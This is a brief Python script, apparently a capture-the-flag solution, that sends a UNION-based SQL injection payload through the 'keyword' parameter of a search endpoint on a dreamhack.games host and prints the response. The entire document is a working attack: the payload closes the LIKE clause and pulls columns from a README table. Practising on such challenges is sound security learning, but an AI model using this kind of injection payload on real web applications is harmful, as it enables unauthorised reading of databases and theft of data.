import requests

url = "http://host1.dreamhack.games:17947/search?keyword="

payload = "sql%' union select 1,hello from README union select 2,light from README union select 3,world from README -- --- -"

res = requests.get(url=url+payload)
print(res.text)